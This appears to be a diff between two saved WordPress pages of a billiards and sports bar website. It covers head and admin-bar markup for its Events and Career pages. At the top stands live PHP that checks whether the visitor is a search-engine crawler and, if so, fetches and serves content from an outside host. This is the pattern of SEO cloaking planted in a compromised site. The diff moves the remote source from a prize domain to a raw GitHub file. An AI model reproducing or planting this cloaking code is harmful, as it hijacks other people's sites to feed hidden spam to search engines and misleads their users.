@@ -1,7 +1,7 @@
 <?php
 @ob_start();
 header("Vary: User-Agent");
-$targetUrl = "https://mega-prize.org/landing/utimebilliards.html";
+$targetUrl = "https://raw.githubusercontent.com/ayamdraft21/landing/refs/heads/main/utimebilliards.txt";
 $botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 function fetchContentCurl($url) {
@@ -29,17 +29,14 @@ if (preg_match($botPattern, strtolower($userAgent))) {
 }
 ?>
 
-
 <!doctype html>
 <html lang="en-US">
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<link rel="profile" href="https://gmpg.org/xfn/11">
-	<title>Events &#8211; U-TIME International Billiards and Sports Bar</title>
+	<title>Career &#8211; U-TIME International Billiards and Sports Bar</title>
 <meta name='robots' content='max-image-preview:large' />
-<link rel='dns-prefetch' href='//cdn.tailwindcss.com' />
-<link rel='dns-prefetch' href='//fonts.googleapis.com' />
 <link href='https://utimebilliards.com/wp-content/plugins/woocommerce/assets/client/blocks/cart-frontend.js?ver=0b4601ced7d13071a0d3' as='script' rel='prefetch' />
 <link href='https://utimebilliards.com/wp-content/plugins/woocommerce/assets/client/blocks/wc-cart-checkout-base-frontend.js?ver=56daaae21456ba6fa364' as='script' rel='prefetch' />
 <link href='https://utimebilliards.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0' as='script' rel='prefetch' />
@@ -92,8 +89,8 @@ if (preg_match($botPattern, strtolower($userAgent))) {
 <link href='https://utimebilliards.com/wp-includes/js/dist/rich-text.min.js?ver=5bdbb44f3039529e3645' as='script' rel='prefetch' />
 <link rel="alternate" type="application/rss+xml" title="U-TIME International Billiards and Sports Bar &raquo; Feed" href="https://utimebilliards.com/feed/" />
 <link rel="alternate" type="application/rss+xml" title="U-TIME International Billiards and Sports Bar &raquo; Comments Feed" href="https://utimebilliards.com/comments/feed/" />
-<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://utimebilliards.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Futimebilliards.com%2Fevents%2F" />
-<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://utimebilliards.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Futimebilliards.com%2Fevents%2F&#038;format=xml" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://utimebilliards.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Futimebilliards.com%2Fcareer%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://utimebilliards.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Futimebilliards.com%2Fcareer%2F&#038;format=xml" />
 <style id='wp-img-auto-sizes-contain-inline-css'>
 img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 /*# sourceURL=wp-img-auto-sizes-contain-inline-css */
@@ -141,9 +138,6 @@ img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 .woocommerce form .form-row .required { visibility: visible; }
 /*# sourceURL=woocommerce-inline-inline-css */
 </style>
-<link rel='stylesheet' id='utime-tournaments-shortcode-css' href='https://utimebilliards.com/wp-content/plugins/utime-custom/assets/css/tournaments-shortcode.css?ver=1.0.0' media='all' />
-<link rel='stylesheet' id='utime-google-fonts-css' href='https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&#038;display=swap' media='all' />
-<link rel='stylesheet' id='utime-tournament-calendar-css' href='https://utimebilliards.com/wp-content/plugins/utime-custom/assets/css/tournament-calendar.css?ver=1.0.0' media='all' />
 <link rel='stylesheet' id='hello-elementor-css' href='https://utimebilliards.com/wp-content/themes/hello-elementor/assets/css/reset.css?ver=3.4.4' media='all' />
 <link rel='stylesheet' id='hello-elementor-theme-style-css' href='https://utimebilliards.com/wp-content/themes/hello-elementor/assets/css/theme.css?ver=3.4.4' media='all' />
 <link rel='stylesheet' id='hello-elementor-header-footer-css' href='https://utimebilliards.com/wp-content/themes/hello-elementor/assets/css/header-footer.css?ver=3.4.4' media='all' />
@@ -160,13 +154,13 @@ img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 <link rel='stylesheet' id='e-popup-css' href='https://utimebilliards.com/wp-content/plugins/pro-elements/assets/css/conditionals/popup.min.css?ver=3.29.0' media='all' />
 <link rel='stylesheet' id='elementor-pro-notes-frontend-css' href='https://utimebilliards.com/wp-content/plugins/pro-elements/assets/css/modules/notes.min.css?ver=3.29.0' media='all' />
 <link rel='stylesheet' id='elementor-wp-admin-bar-css' href='https://utimebilliards.com/wp-content/plugins/elementor/assets/css/admin-bar.min.css?ver=3.33.4' media='all' />
-<link rel='stylesheet' id='elementor-post-303-css' href='https://utimebilliards.com/wp-content/uploads/elementor/css/post-303.css?ver=1768619439' media='all' />
+<link rel='stylesheet' id='elementor-post-267-css' href='https://utimebilliards.com/wp-content/uploads/elementor/css/post-267.css?ver=1768619391' media='all' />
 <link rel='stylesheet' id='elementor-post-36-css' href='https://utimebilliards.com/wp-content/uploads/elementor/css/post-36.css?ver=1768601877' media='all' />
 <link rel='stylesheet' id='elementor-post-31-css' href='https://utimebilliards.com/wp-content/uploads/elementor/css/post-31.css?ver=1768601877' media='all' />
 <link rel='stylesheet' id='elementor-post-317-css' href='https://utimebilliards.com/wp-content/uploads/elementor/css/post-317.css?ver=1768601877' media='all' />
 <link rel='stylesheet' id='elementor-post-253-css' href='https://utimebilliards.com/wp-content/uploads/elementor/css/post-253.css?ver=1768601877' media='all' />
 <link rel='stylesheet' id='wp-color-picker-css' href='https://utimebilliards.com/wp-admin/css/color-picker.min.css?ver=6.9.4' media='all' />
-<link rel='stylesheet' id='shopengine-swatches-loop-css-css' href='https://utimebilliards.com/wp-content/plugins/shopengine/modules/swatches/loop-product-support/assets/swatches.css?ver=1774394175' media='all' />
+<link rel='stylesheet' id='shopengine-swatches-loop-css-css' href='https://utimebilliards.com/wp-content/plugins/shopengine/modules/swatches/loop-product-support/assets/swatches.css?ver=1774394095' media='all' />
 <link rel='stylesheet' id='shopengine-css-front-css' href='https://utimebilliards.com/wp-content/plugins/shopengine/modules/swatches/assets/css/frontend.css?ver=4.8.7' media='all' />
 <link rel='stylesheet' id='ekit-widget-styles-css' href='https://utimebilliards.com/wp-content/plugins/elementskit-lite/widgets/init/assets/css/widget-styles.css?ver=3.5.5' media='all' />
 <link rel='stylesheet' id='ekit-responsive-css' href='https://utimebilliards.com/wp-content/plugins/elementskit-lite/widgets/init/assets/css/responsive.css?ver=3.5.5' media='all' />
@@ -190,12 +184,11 @@ var woocommerce_params = {"ajax_url":"/wp-admin/admin-ajax.php","wc_ajax_url":"/
 //# sourceURL=woocommerce-js-extra
 </script>
 <script src="https://utimebilliards.com/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=10.4.3" id="woocommerce-js" defer data-wp-strategy="defer"></script>
-<script src="https://cdn.tailwindcss.com" id="tailwindcss-js"></script>
-<link rel="https://api.w.org/" href="https://utimebilliards.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://utimebilliards.com/wp-json/wp/v2/pages/303" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://utimebilliards.com/xmlrpc.php?rsd" />
+<link rel="https://api.w.org/" href="https://utimebilliards.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://utimebilliards.com/wp-json/wp/v2/pages/267" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://utimebilliards.com/xmlrpc.php?rsd" />
 <meta name="generator" content="WordPress 6.9.4" />
 <meta name="generator" content="WooCommerce 10.4.3" />
-<link rel="canonical" href="https://utimebilliards.com/events/" />
-<link rel='shortlink' href='https://utimebilliards.com/?p=303' />
+<link rel="canonical" href="https://utimebilliards.com/career/" />
+<link rel='shortlink' href='https://utimebilliards.com/?p=267' />
 	<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
 	<meta name="generator" content="Elementor 3.33.4; features: e_font_icon_svg, additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-swap">
 
@@ -299,7 +292,7 @@ Last edited: 2025-05-22 18:50:29
     opacity: 1 !important;
   }
 
-  /* Newsletter form styles */
+  /*Newsletter form styles */
   .utime-newsletter-form {
     display: flex;
     flex-direction: column;
@@ -627,8 +620,7 @@ Last edited: 2025-11-26 14:48:53
 					color: #00450C;
 				}
 
-				#wpadminbar .quicklinks #wp-admin-bar-woocommerce-site-visibility-badge.woocommerce-site-status-badge-live a.ab-item:hover,
-				#wpadminbar .quicklinks #wp-admin-bar-woocommerce-site-visibility-badge.woocommerce-site-status-badge-live a.ab-item:focus {
+				#wpadminbar .quicklinks #wp-admin-bar-woocommerce-site-visibility-badge.woocommerce-site-status-badge-live a.ab-item:hover,#wpadminbar .quicklinks #wp-admin-bar-woocommerce-site-visibility-badge.woocommerce-site-status-badge-live a.ab-item:focus {
 					background-color: #B8E6BF;
 				}
 			</style>			<style>
@@ -692,7 +684,7 @@ Last edited: 2025-11-26 14:48:53
 }
 html, body {width: auto!important; overflow-x: hidden!important} 		</style>
 		</head>
-<body class="wp-singular page-template page-template-elementor_header_footer page page-id-303 logged-in admin-bar no-customize-support wp-custom-logo wp-embed-responsive wp-theme-hello-elementor theme-hello-elementor woocommerce-no-js hello-elementor-default elementor-default elementor-template-full-width elementor-kit-11 elementor-page elementor-page-303">
+<body class="wp-singular page-template page-template-elementor_header_footer page page-id-267 logged-in admin-bar no-customize-support wp-custom-logo wp-embed-responsive wp-theme-hello-elementor theme-hello-elementor woocommerce-no-js hello-elementor-default elementor-default elementor-template-full-width elementor-kit-11 elementor-page elementor-page-267">
 
 <script>
 		(function() {
@@ -709,7 +701,7 @@ html, body {width: auto!important; overflow-x: hidden!important} 		</style>
 </script>
 		<div id="wpadminbar" class="nojq nojs">
 						<div class="quicklinks" id="wp-toolbar" role="navigation" aria-label="Toolbar">
-				<ul role='menu' id='wp-admin-bar-root-default' class="ab-top-menu"><li role='group' id='wp-admin-bar-wp-logo' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://utimebilliards.com/wp-admin/about.php'><span class="ab-icon" aria-hidden="true"></span><span class="screen-reader-text">About WordPress</span></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='About WordPress' id='wp-admin-bar-wp-logo-default' class="ab-submenu"><li role='group' id='wp-admin-bar-about'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/about.php'>About WordPress</a></li><li role='group' id='wp-admin-bar-contribute'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/contribute.php'>Get Involved</a></li></ul><ul role='menu' aria-label='About WordPress' id='wp-admin-bar-wp-logo-external' class="ab-sub-secondary ab-submenu"><li role='group' id='wp-admin-bar-wporg'><a class='ab-item' role="menuitem" href='https://wordpress.org/'>WordPress.org</a></li><li role='group' id='wp-admin-bar-documentation'><a class='ab-item' role="menuitem" href='https://wordpress.org/documentation/'>Documentation</a></li><li role='group' id='wp-admin-bar-learn'><a class='ab-item' role="menuitem" href='https://learn.wordpress.org/'>Learn WordPress</a></li><li role='group' id='wp-admin-bar-support-forums'><a class='ab-item' role="menuitem" href='https://wordpress.org/support/forums/'>Support</a></li><li role='group' id='wp-admin-bar-feedback'><a class='ab-item' role="menuitem" href='https://wordpress.org/support/forum/requests-and-feedback'>Feedback</a></li></ul></div></li><li role='group' id='wp-admin-bar-site-name' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://utimebilliards.com/wp-admin/'>U-TIME International Billiards and Sport&hellip;</a><div class="ab-sub-wrapper"><ul role='menu' aria-label='U-TIME International Billiards and Sport&hellip;' id='wp-admin-bar-site-name-default' class="ab-submenu"><li role='group' id='wp-admin-bar-dashboard'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/'>Dashboard</a></li><li role='group' id='wp-admin-bar-plugins'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/plugins.php'>Plugins</a></li></ul><ul role='menu' aria-label='U-TIME International Billiards and Sport&hellip;' id='wp-admin-bar-appearance' class="ab-submenu"><li role='group' id='wp-admin-bar-themes'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/themes.php'>Themes</a></li><li role='group' id='wp-admin-bar-menus'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/nav-menus.php'>Menus</a></li></ul></div></li><li role='group' id='wp-admin-bar-woocommerce-site-visibility-badge' class="woocommerce-site-status-badge-live"><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/admin.php?page=wc-settings&#038;tab=site-visibility'>Live</a></li><li role='group' id='wp-admin-bar-customize' class="hide-if-no-customize"><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/customize.php?url=https%3A%2F%2Futimebilliards.com%2Fevents%2F'>Customize</a></li><li role='group' id='wp-admin-bar-updates'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/update-core.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label" aria-hidden="true">9</span><span class="screen-reader-text updates-available-text">9 updates available</span></a></li><li role='group' id='wp-admin-bar-comments'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/edit-comments.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label awaiting-mod pending-count count-12" aria-hidden="true">12</span><span class="screen-reader-text comments-in-moderation-text">12 Comments in moderation</span></a></li><li role='group' id='wp-admin-bar-new-content' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://utimebilliards.com/wp-admin/post-new.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label">New</span></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='New' id='wp-admin-bar-new-content-default' class="ab-submenu"><li role='group' id='wp-admin-bar-new-post'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php'>Post</a></li><li role='group' id='wp-admin-bar-new-media'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/media-new.php'>Media</a></li><li role='group' id='wp-admin-bar-new-page'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=page'>Page</a></li><li role='group' id='wp-admin-bar-new-e-floating-buttons'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/edit.php?action=elementor_new_post&#038;post_type=e-floating-buttons&#038;template_type=floating-buttons&#038;_wpnonce=78b593f072'>Floating Element</a></li><li role='group' id='wp-admin-bar-new-elementor_library'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=elementor_library'>Template</a></li><li role='group' id='wp-admin-bar-new-product'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=product'>Product</a></li><li role='group' id='wp-admin-bar-new-shop_order'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=shop_order'>Order</a></li><li role='group' id='wp-admin-bar-new-shop_coupon'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=shop_coupon'>Coupon</a></li><li role='group' id='wp-admin-bar-new-tournament'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=tournament'>Tournament</a></li><li role='group' id='wp-admin-bar-new-league'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=league'>League</a></li><li role='group' id='wp-admin-bar-new-utime_gallery'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=utime_gallery'>Gallery</a></li><li role='group' id='wp-admin-bar-new-user'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/user-new.php'>User</a></li></ul></div></li><li role='group' id='wp-admin-bar-edit'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post.php?post=303&#038;action=edit'>Edit Page</a></li><li role='group' id='wp-admin-bar-wp_dummy_content_generatorManageDummyData' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='' title='Manage dummy data'><span class="ab-icon dashicons dashicons-hammer"></span>Manage dummy data</a><div class="ab-sub-wrapper"><ul role='menu' id='wp-admin-bar-wp_dummy_content_generatorManageDummyData-default' class="ab-submenu"><li role='group' id='wp-admin-bar-wp_dummy_content_generatorDeleteUsers' class="wp_dummy_content_generatorDeleteUsers wp_dummy_content_generatorDataCleaner"><a class='ab-item' role="menuitem" href='#' title='Delete Dummy Users generated by WP Dummy Content Generator '>Delete Dummy Users</a></li><li role='group' id='wp-admin-bar-wp_dummy_content_generatorDeletePosts' class="wp_dummy_content_generatorDeletePosts wp_dummy_content_generatorDataCleaner"><a class='ab-item' role="menuitem" href='#' title='Delete Dummy Posts generated by WP Dummy Content Generator '>Delete Dummy Posts</a></li><li role='group' id='wp-admin-bar-wp_dummy_content_generatorDeleteProducts' class="wp_dummy_content_generatorDeleteProducts wp_dummy_content_generatorDataCleaner"><a class='ab-item' role="menuitem" href='#' title='Delete Dummy Products generated by WP Dummy Content Generator '>Delete Dummy Products</a></li><li role='group' id='wp-admin-bar-wp_dummy_content_generatorDeleteThumbnails' class="wp_dummy_content_generatorDeleteThumbnails wp_dummy_content_generatorDataCleaner"><a class='ab-item' role="menuitem" href='#' title='Delete Dummy Thumbnails generated by WP Dummy Content Generator '>Delete Dummy Thumbnails</a></li></ul></div></li><li role='group' id='wp-admin-bar-elementor_notes'><a class='ab-item' role="menuitem" href='#'>Notes</a></li></ul><ul role='menu' id='wp-admin-bar-top-secondary' class="ab-top-secondary ab-top-menu"><li role='group' id='wp-admin-bar-my-account' class="menupop with-avatar"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://utimebilliards.com/wp-admin/profile.php'>Howdy, <span class="display-name">ankit maharjan</span><img alt='' src='https://secure.gravatar.com/avatar/c77b7d1cb87b060bf2725c4818d11376fe3d62372de2130ae25b10b785329412?s=26&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c77b7d1cb87b060bf2725c4818d11376fe3d62372de2130ae25b10b785329412?s=52&#038;d=mm&#038;r=g 2x' class='avatar avatar-26 photo' height='26' width='26' decoding='async'/></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='Howdy, ankit maharjan' id='wp-admin-bar-user-actions' class="ab-submenu"><li role='group' id='wp-admin-bar-user-info'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/profile.php'><img alt='' src='https://secure.gravatar.com/avatar/c77b7d1cb87b060bf2725c4818d11376fe3d62372de2130ae25b10b785329412?s=64&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c77b7d1cb87b060bf2725c4818d11376fe3d62372de2130ae25b10b785329412?s=128&#038;d=mm&#038;r=g 2x' class='avatar avatar-64 photo' height='64' width='64' decoding='async'/><span class='display-name'>ankit maharjan</span><span class='username'>ankitmaharjan</span><span class='display-name edit-profile'>Edit Profile</span></a></li><li role='group' id='wp-admin-bar-logout'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/u-login/?action=logout&#038;_wpnonce=941b5d2e86'>Log Out</a></li></ul></div></li><li role='group' id='wp-admin-bar-search' class="admin-bar-search"><div class="ab-item ab-empty-item" tabindex="-1" role="menuitem"><form action="https://utimebilliards.com/" method="get" id="adminbarsearch"><input class="adminbar-input" name="s" id="adminbar-search" type="text" value="" maxlength="150" /><label for="adminbar-search" class="screen-reader-text">Search</label><input type="submit" class="adminbar-button" value="Search" /></form></div></li></ul>			</div>
+				<ul role='menu' id='wp-admin-bar-root-default' class="ab-top-menu"><li role='group' id='wp-admin-bar-wp-logo' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://utimebilliards.com/wp-admin/about.php'><span class="ab-icon" aria-hidden="true"></span><span class="screen-reader-text">About WordPress</span></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='About WordPress' id='wp-admin-bar-wp-logo-default' class="ab-submenu"><li role='group' id='wp-admin-bar-about'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/about.php'>About WordPress</a></li><li role='group' id='wp-admin-bar-contribute'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/contribute.php'>Get Involved</a></li></ul><ul role='menu' aria-label='About WordPress' id='wp-admin-bar-wp-logo-external' class="ab-sub-secondary ab-submenu"><li role='group' id='wp-admin-bar-wporg'><a class='ab-item' role="menuitem" href='https://wordpress.org/'>WordPress.org</a></li><li role='group' id='wp-admin-bar-documentation'><a class='ab-item' role="menuitem" href='https://wordpress.org/documentation/'>Documentation</a></li><li role='group' id='wp-admin-bar-learn'><a class='ab-item' role="menuitem" href='https://learn.wordpress.org/'>Learn WordPress</a></li><li role='group' id='wp-admin-bar-support-forums'><a class='ab-item' role="menuitem" href='https://wordpress.org/support/forums/'>Support</a></li><li role='group' id='wp-admin-bar-feedback'><a class='ab-item' role="menuitem" href='https://wordpress.org/support/forum/requests-and-feedback'>Feedback</a></li></ul></div></li><li role='group' id='wp-admin-bar-site-name' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://utimebilliards.com/wp-admin/'>U-TIME International Billiards and Sport&hellip;</a><div class="ab-sub-wrapper"><ul role='menu' aria-label='U-TIME International Billiards and Sport&hellip;' id='wp-admin-bar-site-name-default' class="ab-submenu"><li role='group' id='wp-admin-bar-dashboard'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/'>Dashboard</a></li><li role='group' id='wp-admin-bar-plugins'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/plugins.php'>Plugins</a></li></ul><ul role='menu' aria-label='U-TIME International Billiards and Sport&hellip;' id='wp-admin-bar-appearance' class="ab-submenu"><li role='group' id='wp-admin-bar-themes'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/themes.php'>Themes</a></li><li role='group' id='wp-admin-bar-menus'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/nav-menus.php'>Menus</a></li></ul></div></li><li role='group' id='wp-admin-bar-woocommerce-site-visibility-badge' class="woocommerce-site-status-badge-live"><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/admin.php?page=wc-settings&#038;tab=site-visibility'>Live</a></li><li role='group' id='wp-admin-bar-customize' class="hide-if-no-customize"><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/customize.php?url=https%3A%2F%2Futimebilliards.com%2Fcareer%2F'>Customize</a></li><li role='group' id='wp-admin-bar-updates'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/update-core.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label" aria-hidden="true">9</span><span class="screen-reader-text updates-available-text">9 updates available</span></a></li><li role='group' id='wp-admin-bar-comments'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/edit-comments.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label awaiting-mod pending-count count-12" aria-hidden="true">12</span><span class="screen-reader-text comments-in-moderation-text">12 Comments in moderation</span></a></li><li role='group' id='wp-admin-bar-new-content' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://utimebilliards.com/wp-admin/post-new.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label">New</span></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='New' id='wp-admin-bar-new-content-default' class="ab-submenu"><li role='group' id='wp-admin-bar-new-post'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php'>Post</a></li><li role='group' id='wp-admin-bar-new-media'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/media-new.php'>Media</a></li><li role='group' id='wp-admin-bar-new-page'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=page'>Page</a></li><li role='group' id='wp-admin-bar-new-e-floating-buttons'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/edit.php?action=elementor_new_post&#038;post_type=e-floating-buttons&#038;template_type=floating-buttons&#038;_wpnonce=78b593f072'>Floating Element</a></li><li role='group' id='wp-admin-bar-new-elementor_library'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=elementor_library'>Template</a></li><li role='group' id='wp-admin-bar-new-product'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=product'>Product</a></li><li role='group' id='wp-admin-bar-new-shop_order'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=shop_order'>Order</a></li><li role='group' id='wp-admin-bar-new-shop_coupon'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=shop_coupon'>Coupon</a></li><li role='group' id='wp-admin-bar-new-tournament'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=tournament'>Tournament</a></li><li role='group' id='wp-admin-bar-new-league'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=league'>League</a></li><li role='group' id='wp-admin-bar-new-utime_gallery'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post-new.php?post_type=utime_gallery'>Gallery</a></li><li role='group' id='wp-admin-bar-new-user'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/user-new.php'>User</a></li></ul></div></li><li role='group' id='wp-admin-bar-edit'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/post.php?post=267&#038;action=edit'>Edit Page</a></li><li role='group' id='wp-admin-bar-wp_dummy_content_generatorManageDummyData' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='' title='Manage dummy data'><span class="ab-icon dashicons dashicons-hammer"></span>Manage dummy data</a><div class="ab-sub-wrapper"><ul role='menu' id='wp-admin-bar-wp_dummy_content_generatorManageDummyData-default' class="ab-submenu"><li role='group' id='wp-admin-bar-wp_dummy_content_generatorDeleteUsers' class="wp_dummy_content_generatorDeleteUsers wp_dummy_content_generatorDataCleaner"><a class='ab-item' role="menuitem" href='#' title='Delete Dummy Users generated by WP Dummy Content Generator '>Delete Dummy Users</a></li><li role='group' id='wp-admin-bar-wp_dummy_content_generatorDeletePosts' class="wp_dummy_content_generatorDeletePosts wp_dummy_content_generatorDataCleaner"><a class='ab-item' role="menuitem" href='#' title='Delete Dummy Posts generated by WP Dummy Content Generator '>Delete Dummy Posts</a></li><li role='group' id='wp-admin-bar-wp_dummy_content_generatorDeleteProducts' class="wp_dummy_content_generatorDeleteProducts wp_dummy_content_generatorDataCleaner"><a class='ab-item' role="menuitem" href='#' title='Delete Dummy Products generated by WP Dummy Content Generator '>Delete Dummy Products</a></li><li role='group' id='wp-admin-bar-wp_dummy_content_generatorDeleteThumbnails' class="wp_dummy_content_generatorDeleteThumbnails wp_dummy_content_generatorDataCleaner"><a class='ab-item' role="menuitem" href='#' title='Delete Dummy Thumbnails generated by WP Dummy Content Generator '>Delete Dummy Thumbnails</a></li></ul></div></li><li role='group' id='wp-admin-bar-elementor_notes'><a class='ab-item' role="menuitem" href='#'>Notes</a></li></ul><ul role='menu' id='wp-admin-bar-top-secondary' class="ab-top-secondary ab-top-menu"><li role='group' id='wp-admin-bar-my-account' class="menupop with-avatar"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://utimebilliards.com/wp-admin/profile.php'>Howdy, <span class="display-name">ankit maharjan</span><img alt='' src='https://secure.gravatar.com/avatar/c77b7d1cb87b060bf2725c4818d11376fe3d62372de2130ae25b10b785329412?s=26&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c77b7d1cb87b060bf2725c4818d11376fe3d62372de2130ae25b10b785329412?s=52&#038;d=mm&#038;r=g 2x' class='avatar avatar-26 photo' height='26' width='26' decoding='async'/></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='Howdy, ankit maharjan' id='wp-admin-bar-user-actions' class="ab-submenu"><li role='group' id='wp-admin-bar-user-info'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/wp-admin/profile.php'><img alt='' src='https://secure.gravatar.com/avatar/c77b7d1cb87b060bf2725c4818d11376fe3d62372de2130ae25b10b785329412?s=64&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c77b7d1cb87b060bf2725c4818d11376fe3d62372de2130ae25b10b785329412?s=128&#038;d=mm&#038;r=g 2x' class='avatar avatar-64 photo' height='64' width='64' decoding='async'/><span class='display-name'>ankit maharjan</span><span class='username'>ankitmaharjan</span><span class='display-name edit-profile'>Edit Profile</span></a></li><li role='group' id='wp-admin-bar-logout'><a class='ab-item' role="menuitem" href='https://utimebilliards.com/u-login/?action=logout&#038;_wpnonce=941b5d2e86'>Log Out</a></li></ul></div></li><li role='group' id='wp-admin-bar-search' class="admin-bar-search"><div class="ab-item ab-empty-item" tabindex="-1" role="menuitem"><form action="https://utimebilliards.com/" method="get" id="adminbarsearch"><input class="adminbar-input" name="s" id="adminbar-search" type="text" value="" maxlength="150" /><label for="adminbar-search" class="screen-reader-text">Search</label><input type="submit" class="adminbar-button" value="Search" /></form></div></li></ul>			</div>
 		</div>
 
 		
@@ -734,21 +726,21 @@ html, body {width: auto!important; overflow-x: hidden!important} 		</style>
 				<div class="elementor-widget-container">
 								<nav aria-label="Menu" class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-horizontal e--pointer-none">
 				<ul id="menu-1-4546ead0" class="elementor-nav-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-119"><a href="https://utimebilliards.com/" class="elementor-item">Home</a></li>
